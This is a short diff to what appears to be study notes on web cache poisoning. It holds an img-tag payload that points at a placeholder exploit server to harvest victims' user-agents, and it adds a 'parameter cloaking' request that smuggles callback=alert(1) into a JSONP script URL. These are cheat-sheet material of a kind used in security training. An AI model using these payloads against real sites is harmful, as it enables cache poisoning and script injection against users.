@@ -293,7 +293,7 @@ If you have post functionality you can use this payload:
 ```html
 <img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
 ```
-
 and final step is to poison the victims user-agents stoled from img tag
 
-
+### Parameter cloaking
+`GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)`
